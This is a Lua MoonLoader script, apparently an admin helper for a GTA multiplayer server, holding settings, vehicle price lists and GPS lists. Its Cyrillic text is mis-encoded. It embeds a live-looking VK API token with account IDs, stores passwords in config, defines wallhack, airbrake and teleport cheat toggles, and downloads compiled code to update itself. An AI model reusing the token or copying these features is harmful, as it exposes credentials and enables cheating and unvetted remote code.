script_name("FReport Helper v2.3 OE")
script_author("N.Everyone")
script_version("2.3")
local samp = require 'samp.events'
local ev = require "lib.samp.events"

require "lib.moonloader"
require "lib.sampfuncs"


local effil = require 'effil'





local sampev = require 'lib.samp.events'
local requests = require 'requests'
requests.http_socket, requests.https_socket = http, http
local imgui = require 'imgui'
local encoding = require 'encoding'

local notify = import 'lib_imgui_notf.lua'

local cfgConfig = "Samp Umbrella Project/FReport Helper 2.3" -- ����� ����������

local inicfg = require 'inicfg' -- ����� ��������
local memory = require 'memory'

local dlstatus = require('moonloader').download_status
local script_vers = 19 --������ 2.3
local script_vers_text = "2.3 bespoleznaya"
local update_url = "https://raw.githubusercontent.com/nikeveryone/Scripts-by-N.Everyone/main/updatefreportOE.ini"
local update_path = getWorkingDirectory() .. "/update.ini"
local script_url = "https://github.com/nikeveryone/Scripts-by-N.Everyone/blob/main/FReport%20Helper%20OE.luac?raw=true" -- ��� ���� ������
local script_path = thisScript().path
update_state = false

type_forms = -1
selected = 0
local keys = require "vkeys"
local key = require 'vkeys' --
local ReloadBool = false
local UpdateBool = true
local tag = "{ffdead}[FReport Helper]:"
local admmenu = imgui.ImBool(false)
local recon_helper = imgui.ImBool(false)
local admstats = imgui.ImBool(false)
local version = 'script_version'
local LoadedNicknames = {}
local LoadedLevels = {}
local main_color = 0x5A90CE
local color_puprle = 0x8B008B
local colorsdeb = {
 main_color_text = "{f44f36}",
 main_color_text = "{C71585}",
 main_color_text = "{32CD32}",
 main_color_text = "{D2691E}",
 main_color_text = "{FF7538}",
 main_color_text = "{FF4500}",
 main_color_text = "{228B22}",
 main_color_text = "{006400}",
 main_color_text = "{00FFFF}",
 main_color_text = "{8B0000}",
 main_color_text = "{008000}",
 main_color_text = "{808080}",
 main_color_text = "{FFFF00}",
 main_color_text = "{FF7F50}",
 main_color_text = "{FF0000}",
 main_color_text = "{FFA500}",
 main_color_text = "{FFD700}",
 main_color_text = "{FF69B4}",
 main_color_text = "{000000}",
 main_color_text = "{0000FF}",
 main_color_text = "{FFFF00}",
 main_color_text = "{B7AFAF}"
}
local ToScreen = convertGameScreenCoordsToWindowScreenCoords

local defString = ""
-- ��� ������� � �������
local dialogArr = {"������, ��� ����� �������", "� ��� ����", "{FF00FF}��� ������� �����", "� ��� ���������"}
local dialogStr = ""

encoding.default = 'CP1251'
u8 = encoding.UTF8
local pokupka = imgui.ImBool(false)
local izmena = imgui.ImBool(false)
local izmenarmenu = imgui.ImBool(false)
local mn = imgui.ImBool(false)
local okno = imgui.ImBool(false)
local backokno = imgui.ImBool(false)
local nextokno = imgui.ImBool(false)


local statew = imgui.ImBool(false)
local statew2 = imgui.ImBool(false)
local statew4 = imgui.ImBool(false)
local statew5 = imgui.ImBool(false)
local statew9 = imgui.ImBool(false)
local statew6 = imgui.ImBool(false)
local statew7 = imgui.ImBool(false)

local text_buffer = imgui.ImBuffer(256)


local pstatew = imgui.ImBool(false)
local pstatew2 = imgui.ImBool(false)
local pstatew4 = imgui.ImBool(false)
local pstatew5 = imgui.ImBool(false)
local pstatew9 = imgui.ImBool(false)
local pstatew6 = imgui.ImBool(false)
local pstatew7 = imgui.ImBool(false)
local punjail_menu = imgui.ImBool(false)

local unjail_menu = imgui.ImBool(false)
local iScreenWidth, iScreenHeight = getScreenResolution()
local afkld = imgui.ImBool(false)
local setskin = imgui.ImBool(false)


local shtuka = imgui.ImBool(false)
local shtukadva = imgui.ImBool(false)
local shprice = imgui.ImBool(false)
local shpricedva = imgui.ImBool(false)
local smn = imgui.ImBool(false)
local smndva = imgui.ImBool(false)
papapa = false
parapapa = false

testpremium = 0

local key, server, ts

function threadHandle(runner, url, args, resolve, reject) -- ��������� effil ������ ��� ����������
	local t = runner(url, args)
	local r = t:get(0)
	while not r do
		r = t:get(0)
		wait(0)
	end
	local status = t:status()
	if status == 'completed' then
		local ok, result = r[1], r[2]
		if ok then resolve(result) else reject(result) end
	elseif err then
		reject(err)
	elseif status == 'canceled' then
		reject(status)
	end
	t:cancel(0)
end

function requestRunner() -- �������� effil ������ � �������� https �������
	return effil.thread(function(u, a)
		local https = require 'ssl.https'
		local ok, result = pcall(https.request, u, a)
		if ok then
			return {true, result}
		else
			return {false, result}
		end
	end)
end

function async_http_request(url, args, resolve, reject)
	local runner = requestRunner()
	if not reject then reject = function() end end
	lua_thread.create(function()
		threadHandle(runner, url, args, resolve, reject)
	end)
end

local vkerr, vkerrsend -- ��������� � ������� ������, nil ���� ��� ��

function loop_async_http_request(url, args, reject)
	local runner = requestRunner()
	if not reject then reject = function() end end
	lua_thread.create(function()
		while true do
			while not key do wait(0) end
			url = server .. '?act=a_check&key=' .. key .. '&ts=' .. ts .. '&wait=25' --������ url ������ ����� ������ �����a, ��� ��� server/key/ts ����� ����������
			threadHandle(runner, url, args, longpollResolve, reject)
		end
	end)
end

if not doesDirectoryExist('moonloader/config') then
	createDirectory('moonloader/config')
end

local defaults = {
	main = {
		token = 'vk1.a.QHaJP8jEcLjrtg0xbss-55CBk_jTd-_Gck-hPO8pmfOOxlSzQXHreAE2rR2hFUWRwH203PzSImlmE8GKBrZFBNTZPpIdeV8Q53jxnG8aRp6uZ-S_wjFDjKmD9jI7KLpxpqW5JUAp4njcMZAkKaUQtkhHCEe4Ret5go8gfxGrWFv6iddKPQX5pThx1v4o_iqi',
		id = '604049655',
		group = '215632981',
		profile = 0,
		recv = true,
		send = true
	},
	dialogs = {
		enable = true,
		accept = '!d',
		decline = '!dc'
	},
	other = {
		pos = true,
		dc = true,
		chatcolor = false,
		debug = false,
		tocmd = '!to',
		spawn = true,
		status = '!status'
	},
	status = {
		nick = true,
		server = true,
		hp = true,
		armor = true,
		pos = true,
		online = true,
		money = true
	}
}

local ini = inicfg.load(defaults, 'vkcnsettings.ini')
local accs = inicfg.load({}, 'vkaccs.ini')
local accId = -1

--buffers
local tokenBuf = imgui.ImBuffer(ini.main.token, 256)
local idBuf = imgui.ImBuffer(tostring(ini.main.id), 128)
local groupBuf = imgui.ImBuffer(tostring(ini.main.group), 128)
local profileBuf = imgui.ImInt(ini.main.profile)
local recvBuf = imgui.ImBool(ini.main.recv)
local sendBuf = imgui.ImBool(ini.main.send)

local diaEnable = imgui.ImBool(ini.dialogs.enable)
local diaAccept = imgui.ImBuffer(u8(ini.dialogs.accept), 64)
local diaDecline = imgui.ImBuffer(u8(ini.dialogs.decline), 64)

local otherPos = imgui.ImBool(ini.other.pos)
local otherDc = imgui.ImBool(ini.other.dc)
local otherSpawn = imgui.ImBool(ini.other.spawn)

local chatColor = imgui.ImBool(ini.other.chatcolor)
local debugMode = imgui.ImBool(ini.other.debug)

local toCmd = imgui.ImBuffer(u8(ini.other.tocmd), 64)
local status = imgui.ImBuffer(u8(ini.other.status), 64)

local statusNick = imgui.ImBool(ini.status.nick)
local statusServer = imgui.ImBool(ini.status.server)
local statusHp = imgui.ImBool(ini.status.hp)
local statusArmor = imgui.ImBool(ini.status.armor)
local statusPos = imgui.ImBool(ini.status.pos)
local statusOnline = imgui.ImBool(ini.status.online)
local statusMoney = imgui.ImBool(ini.status.money)

local curDialog, curStyle


for _, str in ipairs(dialogArr) do
    dialogStr = dialogStr .. str .. "\n"
end

local items = {
	u8"Ҹ����",
	u8"�����",
	u8"�������",
	u8"���������",
	u8"������",
	u8"���������",
	u8"����������",
	u8"Ҹ���-�������",
	u8"������-�����",
	u8"�����",
	u8"��������",
	u8"������-�������",
	u8"�����-�������",
	u8"�������",
	u8"Ҹ���-���������",
	u8"���������",
}

local cfg = inicfg.load({
	settings = {
	pervayaknopka = u8"�1 ����������������",
	pervayatext = none,
	dvaknopka = u8"�2 ����������������",
	dvatext = none,
	triknopka = u8"�3 ����������������",
	tritext = none,
	chetiriknopka = u8"�4 ����������������",
	chetiritext = none,
	pyatknopka = u8"�5 ����������������",
	pyattext = none,

	shestknopka = u8"�6 ����������������",
	shesttext = none,
			semknopka = u8"�7 ����������������",
	semtext = none,
	vosemknopka = u8"�8 ����������������",
	vosemtext = none,
	devyatknopka = u8"�9 ����������������",
	devyattext = none,
	desyatknopka = u8"�10 ����������������",
	desyattext = none,
		forever = true,
	 oprosik = true,
	 nachalo = true,
	    lvladmin = '1',
		theme = '1',
		new_rep = false,
		new_a = false,
		new_pm = false,
		new_arep = false,
		fov_up = false,
		table = false,
		speed_hack = false,
		aforms_alog = false,
		auto_time = false,
		aforms_bind = 'B',
		anticheat = false,
		ban_neadek = '',
		ban_oskadm = '',
		ban_vred = '',
		ban_oskrod = '',
		mute_ypom = '',
		mute_offtop = '',
		mute_oskpl = '',
		mute_caps = '',
		mute_flood = '',
		mute_neadek = '',
		prison_dm = '',
		prison_db = '',
		prison_tk = '',
		prison_sk = '',
		prison_bag = '',
		prison_cheat = '',
		slide = '20',
		anti_afk = false,
		killlist = false,
		togphone = false,
		aforms = false,
		pm = false,
		jb = false,
		admchat = false,
		activated = false,
		password = '',
		kod = '',
		enterkode = false,
		admpass = '',
		autoadmpass = false,
		fast_cmd = false,
		report_recon = false,
		report_bind = '',
		whkey = '116',
		whmode = 'all',
		save_ip = false,
		admin_job = false,
		admin_mp = false,
		wallhack = false,
		teleport = false,
		airbrake = false,
		airbrakeSpeed = '1',
		antifall = false,
		espcnm = false,
		espcar = false,
		espcgi = false,
		espcid = false,
		espchp = false,
		espcsp = false,
		espcdr = false
	},
}, cfgConfig)

local ints = {
	speedAir = imgui.ImInt(tonumber(cfg.settings.airbrakeSpeed))
}

local other = {
	recon_id = -1,
	tema = imgui.ImInt(2),
	aforms_forma_time = 0,
	aforms_forma = false,
	defaultState = false,
	activation = false
}

local bools = {
	anticheat = imgui.ImBool(cfg.settings.anticheat),
	table = imgui.ImBool(cfg.settings.table),
	speed_hack = imgui.ImBool(cfg.settings.speed_hack),
	new_pm = imgui.ImBool(cfg.settings.new_pm),
	new_rep = imgui.ImBool(cfg.settings.new_rep),
	new_a = imgui.ImBool(cfg.settings.new_a),
	new_arep = imgui.ImBool(cfg.settings.new_arep),
	fov_up = imgui.ImBool(cfg.settings.fov_up),
	aforms_alog = imgui.ImBool(cfg.settings.aforms_alog),
	auto_time = imgui.ImBool(cfg.settings.auto_time),
	aforms = imgui.ImBool(cfg.settings.aforms),
	airbrakestatus = imgui.ImBool(cfg.settings.airbrake),
	wallhackstatus = imgui.ImBool(cfg.settings.wallhack),
	antifallstatus = imgui.ImBool(cfg.settings.antifall),
	doLogin = imgui.ImBool(cfg.settings.activated),
	isKode = imgui.ImBool(cfg.settings.enterkode),
	autoadmpass = imgui.ImBool(cfg.settings.autoadmpass),
	killlist = imgui.ImBool(cfg.settings.killlist),
	report_recon = imgui.ImBool(cfg.settings.report_recon),
	slide = imgui.ImInt(cfg.settings.slide),
	espcar = imgui.ImBool(cfg.settings.espcar),
	espcnm = imgui.ImBool(cfg.settings.espcnm),
	espcgi = imgui.ImBool(cfg.settings.espcgi),
	espcid = imgui.ImBool(cfg.settings.espcid),
	espchp = imgui.ImBool(cfg.settings.espchp),
	espcdr = imgui.ImBool(cfg.settings.espcdr),
	espcsp = imgui.ImBool(cfg.settings.espcsp),
	teleport = imgui.ImBool(cfg.settings.teleport)
}

local tag = "{ffdead}[FReport Helper]:{ffdead} "
local list_prices = { "Bravura - 50.000$ - [ID: 401]",
                        "Perrenial - 25.000$ - [ID: 404]",
                        "Manana - 50.000$ - [ID: 410]",
                        "Esperanto - 50.000$ - [iID: 419]",
                        "Bobcat - 25.000$ - [ID: 422]",
                        "Previon - 25.000$ - [ID: 436]",
                        "Stallion - 50.000$ - [ID: 439]",
                        "Solair - 50.000$ - [ID: 458]",
                        "Glendale - 25.000$ - [ID: 466]",
                        "Hermes - 25.000$ - [ID: 474]",
                        "Walton - 50.000$ - [ID: 478]",
                        "Regina - 25.000$ - [ID: 479]",
                        "Virgo - 50.000$ - [ID: 491]",
                        "Greenwood - 25.000$ - [ID: 492]",
                        "Mesa - 50.000 - [ID: 500]",
                        "Elegant - 25.000$ - [ID: 507]",
                        "Nebula - 50.000$ - [ID: 516]",
                        "Majestic - 50.000$ - [ID: 517]",
                        "Buccanner - 25.000$ - [ID: 518]",
                        "Fortune - 25.000$ - [ID: 526]",
                        "Cadrona - 50.000$ - [ID: 527]",
                        "Willard - 50.000$ - [ID: 529]",
                        "Vincent - 25.000$ - [ID: 540]",
                        "Clover - 25.000$ - [ID: 542]",
                        "Sadler - 25.000$ - [ID: 543]",
                        "Hustler - 50.000$ - [ID: 545]",
                        "Intruder - 25.000$ - [ID: 546]",
                        "Primo - 25.000$ - [ID: 547]",
                        "Tampa - 25.000$ - [ID: 549]",
                        "Emperor - 25.000$ - [ID: 585]",
                        "Picador - 25.000$ - [ID: 600]",
                        "Glendale - 25.000$ - [ID: 604]",
                        "Sadler - 25.000$ - [ID: 605]"
                    }
					
local pricesall = {
 prices1 = "Bravura - 50.000$ - [ID: 401]\nPerrenial - 25.000$ - [ID: 404]\nManana - 50.000$ - [ID: 410]\nEsperanto - 50.000$ - [ID: 419]\nBobcat - 25.000$ - [ID: 422]\nPrevion - 25.000$ - [ID: 436]\nStallion - 50.000$ - [ID: 439]\nSolair - 50.000$ - [ID: 458]\nGlendale - 25.000$ - [ID: 466]\nHermes - 25.000$ - [ID: 474]\nWalton - 50.000$ - [ID: 478]\nRegina - 25.000$ - [ID: 479]\nVirgo - 50.000$ - [ID: 491]\nGreenwood - 25.000$ - [ID: 492]\nMesa - 50.000 - [ID: 500]\nElegant - 25.000$ - [ID: 507]\nNebula - 50.000$ - [ID: 516]\nMajestic - 50.000$ - [ID: 517]\nBuccanner - 25.000$ - [ID: 518]\nFortune - 25.000$ - [ID: 526]\nCadrona - 50.000$ - [ID: 527]\nWillard - 50.000$ - [ID: 529]\nVincent - 25.000$ - [ID: 540]\nClover - 25.000$ - [ID: 542]\nSadler - 25.000$ - [ID: 543]\nHustler - 50.000$ - [ID: 545]\nIntruder - 25.000$ - [ID: 546]\nPrimo - 25.000$ - [ID: 547]\nTampa - 25.000$ - [ID: 549]\nEmperor - 25.000$ - [ID: 585]\nPicador - 25.000$ - [ID: 600]\nGlendale - 25.000$ - [ID: 604]\nSadler - 25.000$ - [ID: 605]",
 prices2 = "Landstalker - 100.000$ - [id 400]\nSentinel - 100.000$ - [ID: 405]\nVoodoo - 250.000$ - [ID: 412]\nMoonbeam - 100.000$ - [ID: 418]\nWashington - 100.000$ - [ID: 401]\nPremier - 100.000$ - [ID: 426]\nAdmiral - 100.000$ - [ID: 445]\nOceanic - 100.000$ - [ID: 467]\nSabre - 100.000$ -[ID: 475]\nBurrito - 250.000$ - [ID: 482]\nRancher - 100.000$ - [ID: 489]\nBlista Compact - 100.000$ - [ID: 496]\nRancher - 100.000$ - [ID: 505]\nFeltzer - 100.000$ - [ID: 533]\nRemington - 250.000 - [ID: 534]\nSlamvan - 250.000$ - [ID: 535]\nBlade - 250.000$ - [ID: 536]\nSunrise - 100.000$ - [ID: 550]\nMerit - 100.000$ - [ID: 551]\nYosemite - 100.000$ - [ID: 554]\nWindsor - 250.000$ - [ID: 555]\nUranus - 250.000$ - [ID: 558]\nElegy - 250.000$ - [ID: 562]\nFlash - 250.000$ - [ID: 565]\nTahoma - 250.000$ - [ID: 566]\nSavanna - 250.000$ - [ID: 567]\nBroadway - 250.000$ - [ID: 575]\nTornado - 250.000$ - [ID: 576]\nHuntley - 250.000$ - [ID: 579]\nEuros - 250.000$ - [ID: 587]\nClub - 250.000$ - [ID: 589]\nAlpha - 250.000$ - [ID: 602]\nPheonix - 250.000$ - [ID: 603]",
 prices3 = "Buffalo - 1.000.000$ - [ID: 402]\nZR - 350 - 750.000$ - [ID: 477]\nComet - 750.000$ - [ID: 480]\nSuper GT - 1.000.000$ - [ID: 506]\nJourney - 1.000.000$ - [ID: 508]\nJester - 750.000$ - [ID: 559]\nSultan - 1.000.000$ - [ID: 560]\nStratum - 500.000$ - [ID: 561]\nStafford - 1.000.000$ - [ID: 580]",
 prices4 = "Infernus - 2.500.000$ - [ID: 411]\nCheetah - 2.000.000$ - [ID: 415]\nBanshee - 1.500.000$ - [ID: 429]\nTurismo - 2.500.000$ - [ID: 451]\nBullet - 2.500.000$ - [ID: 541]",
 prices5 = "PCJ-600 - 1.000.000$ - [ID: 461]\nFaggio - 50.000$ - [ID: 462]\nFreeway - 500.000$ - [ID: 463]\nSanchez - 250.000$ - [ID: 458]\nQuad - 100.000$ - [ID: 471]\nBMX - 25.000$ - [ID: 481]\nBike - 25.000$ - [ID: 509]\nMountain Bike - 25.000$ - [ID: 510]\nFCR - 900 -1.500.000$ - [ID: 521]\nBF - 400 - 750.000$ - [ID: 581]\nWayfarer - 250.000$ - [ID: 586]",
 prices6 = "Nevada - 2.500.000$ - [ID: 553]\nShamal - 2.500.000$ - [ID: 519]\nBeagle - 1.500.000$ - [ID: 511]\nMaverick - 2.500.000$ - [ID: 487]\nSparrow - 2.000.000$ - [ID: 469]\nRustler - 1.000.000$ - [ID: 476]\nCropduster - 750.000$ - [ID: 512]\nStunt - 1.000.000$ - [ID: 513]\nDodo - 500.000$ - [ID: 593]",
 prices7 = "Marquis - 2.500.000$ - [ID: 484]\nSqualo - 1.500.000$ - [ID: 446]\nSpeeder - 2.000.000$ - [ID: 452]\nTropic - 2.500.000$ - [ID: 454]",
 pricesrealcars = "Mercedes-Benz G63 AMG 6x6 - 10.000FM \n- [ID: 3610]\nRolls-Royce Phantom - 10.000FM \n- [ID: 4546]\nFerrari Pista 488 - 9.500FM - [ID: 3222]\nMcLaren 720s - 9.500FM - [ID: 3248]\nBugatti Chiron - 9.000FM - [ID: 3215]\nPorshe Panamero Turbo - \n8.000FM - [ID: 3349]\nMcLren 600LT - 8.000FM - [ID: 3219]\nBentley Continental - 7.500FM \n- [ID: 3201]\nBentley Bentayga - 7.500FM - [ID: 3200]\nAston Matrin Vantage - 7.500FM \n- [ID: 3194]\nMercedes-Benz G63 \n- 7.000FM - [ID: 3870]\nMercedes-Maybach - 7.000FM \n- [ID: 3239]\nBMW M8 - 6.500FM - [ID: 3210]\nRange Rover SVR - 6.000FM - [ID: 3429]\nLexus LC - 5.500FM - [ID: 3233]",
 pricesrealcars2 = "Toyota Celica - 300FM - [ID: 4766]\nToyota Chaser - 250FM - [ID: 4764]\nToyota Mark II - 200FM - [ID: 3236]\nTesla Model S - 5.000FM - [ID: 3245]\nNissan GTR - 4.500FM - [ID: 3974]\nCadilac Escalade - 3.500FM - [ID: 3217]\nMercedes-Benz E63 AMG S \n- 3.000FM - [ID: 3247]\nLexus LX570 - 2.750FM - [ID: 3235]\nMercedes-Benz AMG GT63 \n- 2.750FM - [ID: 3205]\nLand Cruiser - 2.500FM - [ID: 3231]\nBMW X5M - 2.500FM - [ID: 3211]\nBMW M5 F90 - 2.500FM - [ID: 3208]\nAudi R8 - 2.250FM - [ID: 3197]\nBMW M4 F82 - 2.000FM - [ID: 3204]\nJeep Grand Cherekee \n- 1.750FM - [ID: 3227]\nBMW M5 E60 - 1.500FM - [ID: 3206]\nAudi RS7 - 1.500FM - [ID: 3199]\nBMW E39 - 1.250FM - [ID: 3202]\nMercedes-Benz C63 AMG \n- 1.250FM - [ID: 3254]\nLexus IS - 1.250FM - [ID: 3234]\nCamry XV 70 - 1.250FM - [ID: 3218]\nTesla Cybertruck - 1.000FM - [ID: 4763]\nAudi 3 - 750FM - [ID: 3195]",
 pricesrealcars3 = "Mercedes-Benz W124 - 500FM \n- [ID: 3883]\nMercedes-Benz 230 - 400FM \n- [ID: 3784]\nMercedes-Benz 190E - 350FM \n- [ID: 3611]"
}

local gps1 = "[1] �������������\n[2] ���������\n[3] ����� �����\n[4] ���������\n[65] ����������� �����\n[6] ����� ��������\n[7] ���������\n[8] ������� �����������\n[9] ���������� ��\n[10] ���������� ��\n[11] ���������� ��\n[12] ��-��\n[13] Flin Town\n[14] ׸���� �����\n[15] �������\n[16] ����� ����������� �����\n[17] �����\n[18] �����\n[19] ����� �����\n[20] �����"
local gps2 = "[1] ��������������� �����\n[2] ������������� �����\n[3] �����\n[4] �������\n[5] ���������\n[6] ���������\n[7] ��������\n[8] ��������� ��������"
local gps3 = "[1] ��������� �����\n[2] �������� �������� [LS]\n[3] �������� �������� [SF]\n[4] �������� �������� [LV]\n[5] �������� �������� [��������]\n[6] ����������� [LS]\n[7] ����������� [SF]\n[8] ����������� [LV]\n[9] ����������\n[10] ��������� �����\n[11] �������� [LS]\n[12] �������� [SF]\n[13] �������� [LV]\n[14] �������� ������ [LS]\n[15] �������� ������ [SF]\n[16] �������� ������ [LV #1]\n[17] �������� ������ [LV #2]\n[18] �������� �������\n[19] ����� [LS]\n[20] ����� [SF]\n[21] ����� [LV]\n[22] ��������� �������\n[23] ��������\n[24] ��������"
local gps4 = "[1] �������������\n[2] ������� [LS]\n[3] ������� [SF]\n[4] ������� [LV]\n[5] ������� [RC]\n[6] ���\n[7] ������������ �������\n[8] �������� [LS]\n[9] �������� [SF]\n[10] �������� [LV]\n[11] ���������� [LS]\n[12] ���������� [SF]\n[13] ���������� [LV]\n[14] ���������\n[15] ������\n[16] The Grove Gang\n[17] The Ballas Gang\n[18] The Rifa Gang\n[19] The Aztecas Gang\n[20] The Vagos Gang\n[21] Russian Mafia\n[22] La Cosa Nostra\n[23] Yakuza\n[24] �������"
local gps5 = "[1] ���. ��������� [���. �������]\n[2] �����-����� [�����. �������]\n[3] ����������� [��������]\n[4] ����������� [�����]"
local gps6 = "[1] ����� (���������� �����)\n[2] �������� (���������� �����)\n[3] ����� (���������� ������)\n[4] ������ (���������� ������)\n[5] ����� (���������� ������)\n[6] ���� (���������� ������)\n[7] ������� (���������� ������)\n[8] ���� (���������� ������)\n[9] ��������� (���������� ���)\n[10] ���� (���������� ���)\n[11] �������� (���������� ���)\n[12] ����� (���������� ���)\n[13] ����� (���������� ���)"
local gps7 = "[1] ��������� �����������\n[2] ��������� ������� ������\n[3] ��������� ���\n[4] ��������� ��������\n[5] ��������� ��������\n[6] ��������� ����������\n[7] ��������� ����������� ��������\n[8] ��������� ��������\n[9] ��������� ������� �����������\n[10] ��������� �����\n[11] ��������� ������� �����\n[12] ��������� ���������\n[13] ��������� ����������\n[14] ��������� ����� � ����\n[15] ��������� ������� ������\n[16] ��������� ��������� ��������\n[17] ��������� ���������� ������\n[18] ��������� ������� ���������\n�������\n[19] ��������� �������� ���������\n[20] ��������� ��������������\n[21] ��������� ����� �����\n[22]��������� ������ �����\n[23] ��������� ���������\n[24] ��������� ������������ ��������\n[25] ��������� ���������\n[26] ��������� ����������"
--local gps8 = "[1] ��� �����: 1\n[2] ��� �����: 2\n[3] ��� �����: 3"
local gps9 = "[1] ������ ����� �1\n[2] ������ ����� �2\n[3] ������ ����� �3"
local gps10 = "[1] ������������ �������� �1\n[2] ������������ �������� �2\n[3] ������������ �������� �3"
local gpsdalnoboy = "[1] ��������������� ����� (��������)\n[2] ������������� ����� (��������)\n[3] ��������������� ���� - (���������)\n[4] ��������� - Nope - (���������)\n[1] ��������� - C - (���������)\n[1] ��������� - B - (���������)\n[1] ��������� - A - (���������)"
local gps11 = "[1] ��������� [LS] - Nope\n[2] ��������� [SF] - C\n[3] ��������� [SF] - B\n[4] ��������� [LV] - A\n[5] ��������� [LV] - Real Cars\n[6] ���������\n[7] ���-����\n[8] ��������\n[9] ������ ������ �����\n[10] ������� ������ �����\n[11] ������������ ���������\n� �������\n[12] ��������"
local gps13 = "[1] ����� �����������\n[2] Casino Four Dragons\n[3] Casino Caligula"
local gps14 = "[1] ��� ���\n[2] ��� ������\n[3] ��� ���������\n[4] ��� �����"




local main_window_state = imgui.ImBool(false)
local prices_window_state = imgui.ImBool(false)
local gps_window_state = imgui.ImBool(false)
local text_buffer = imgui.ImBuffer(256)
local text_bufferlvl = imgui.ImBuffer(256)
local text_bufferstatus = imgui.ImBuffer(256)
local text_bufferstatuspremium = imgui.ImBuffer(256)
local text_bufferpremium = imgui.ImBuffer(256)
local text_bufferpremiumstat = imgui.ImBuffer(256)
local text_buffer_unjail = imgui.ImBuffer(122)
local text_buffer_afkld = imgui.ImBuffer(122)
local text_buffer_setskin = imgui.ImBuffer(122)
local main_x, main_y = getScreenResolution()


local text_buffer_odinknop = imgui.ImBuffer(122)
local text_buffer_odintext = imgui.ImBuffer(122)
local text_buffer_dvaknop = imgui.ImBuffer(122)
local text_buffer_dvatext = imgui.ImBuffer(122)
local text_buffer_triknop = imgui.ImBuffer(122)
local text_buffer_tritext = imgui.ImBuffer(122)
local text_buffer_chetiriknop = imgui.ImBuffer(122)
local text_buffer_chetiritext = imgui.ImBuffer(122)
local text_buffer_pyatknop = imgui.ImBuffer(122)
local text_buffer_pyattext = imgui.ImBuffer(122)
local text_buffer_shestknop = imgui.ImBuffer(122)
local text_buffer_shesttext = imgui.ImBuffer(122)
local text_buffer_semknop = imgui.ImBuffer(122)
local text_buffer_semtext = imgui.ImBuffer(122)
local text_buffer_vosemknop = imgui.ImBuffer(122)
local text_buffer_vosemtext = imgui.ImBuffer(122)
local text_buffer_devyatknop = imgui.ImBuffer(122)
local text_buffer_devyattext = imgui.ImBuffer(122)
local text_buffer_desyatknop = imgui.ImBuffer(122)
local text_buffer_desyattext = imgui.ImBuffer(122)

if not doesFileExist('moonloader/config/Samp Umbrella Project/FReport Helper 2.3.ini') then
	inicfg.save(cfg, cfgConfig)
	cfg = inicfg.load({
		settings = {
		pervayaknopka = u8"�1 ����������������",
	pervayatext = none,
	dvaknopka = u8"�2 ����������������",
	dvatext = none,
	triknopka = u8"�3 ����������������",
	tritext = none,
	chetiriknopka = u8"�4 ����������������",
	chetiritext = none,
	pyatknopka = u8"�5 ����������������",
	pyattext = none,

	shestknopka = u8"�6 ����������������",
	shesttext = none,
			semknopka = u8"�7 ����������������",
	semtext = none,
	vosemknopka = u8"�8 ����������������",
	vosemtext = none,
	devyatknopka = u8"�9 ����������������",
	devyattext = none,
	desyatknopka = u8"�10 ����������������",
	desyattext = none,
		forever = true,
		 oprosik = true,
		 nachalo = true,
			lvladmin = '1',
			theme = '1',
			new_rep = false,
			new_a = false,
			new_pm = false,
			new_arep = false,
			fov_up = false,
			table = false,
			speed_hack = false,
			aforms_alog = false,
			auto_time = false,
			aforms_bind = 'B',
			anticheat = false,
			ban_neadek = '',
			ban_oskadm = '',
			ban_vred = '',
			ban_oskrod = '',
			mute_ypom = '',
			mute_offtop = '',
			mute_oskpl = '',
			mute_caps = '',
			mute_flood = '',
			mute_neadek = '',
			prison_dm = '',
			prison_db = '',
			prison_tk = '',
			prison_sk = '',
			prison_bag = '',
			prison_cheat = '',
			slide = '20',
			anti_afk = false,
			killlist = false,
			togphone = false,
			aforms = false,
			pm = false,
			jb = false,
			admchat = false,
			activated = false,
			password = '',
			kod = '',
			enterkode = false,
			admpass = '',
			autoadmpass = false,
			fast_cmd = false,
			report_recon = false,
			report_bind = '',
			whkey = '116',
			whmode = 'all',
			save_ip = false,
			admin_job = false,
			admin_mp = false,
			wallhack = false,
			teleport = false,
			airbrake = false,
			airbrakeSpeed = '1',
			antifall = false,
			espcnm = false,
			espcar = false,
			espcgi = false,
			espcid = false,
			espchp = false,
			espcsp = false,
			espcdr = false
		},
	}, cfgConfig)
end

function easy_style()
	imgui.SwitchContext()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4

	style.WindowPadding = imgui.ImVec2(9, 5)
	style.WindowRounding = 10
	style.ChildWindowRounding = 10
	style.FramePadding = imgui.ImVec2(5, 3)
	style.FrameRounding = 6.0
	style.ItemSpacing = imgui.ImVec2(9.0, 3.0)
	style.ItemInnerSpacing = imgui.ImVec2(9.0, 3.0)
	style.IndentSpacing = 21
	style.ScrollbarSize = 6.0
	style.ScrollbarRounding = 13
	style.GrabMinSize = 17.0
	style.GrabRounding = 16.0

	style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
	style.ButtonTextAlign = imgui.ImVec2(0.5, 0.5)
end

function theme1()
	local style = imgui.GetStyle()
	local Colors = style.Colors
	local ImVec4 = imgui.ImVec4
	Colors[imgui.Col.Text] = ImVec4(0.80, 0.80, 0.83, 1.00)
	Colors[imgui.Col.TextDisabled] = ImVec4(0.24, 0.23, 0.29, 1.00)
	Colors[imgui.Col.WindowBg] = ImVec4(0.06, 0.05, 0.07, 1.00)
	Colors[imgui.Col.ChildWindowBg] = ImVec4(0.07, 0.07, 0.09, 1.00)
	Colors[imgui.Col.PopupBg] = ImVec4(0.07, 0.07, 0.09, 1.00)
	Colors[imgui.Col.Border] = ImVec4(0.80, 0.80, 0.83, 0.88)
	Colors[imgui.Col.BorderShadow] = ImVec4(0.92, 0.91, 0.88, 0.00)
	Colors[imgui.Col.FrameBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
	Colors[imgui.Col.FrameBgHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
	Colors[imgui.Col.FrameBgActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
	Colors[imgui.Col.TitleBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
	Colors[imgui.Col.TitleBgCollapsed] = ImVec4(1.00, 0.98, 0.95, 0.75)
	Colors[imgui.Col.TitleBgActive] = ImVec4(0.07, 0.07, 0.09, 1.00)
	Colors[imgui.Col.MenuBarBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
	Colors[imgui.Col.ScrollbarBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
	Colors[imgui.Col.ScrollbarGrab] = ImVec4(0.80, 0.80, 0.83, 0.31)
	Colors[imgui.Col.ScrollbarGrabHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
	Colors[imgui.Col.ScrollbarGrabActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
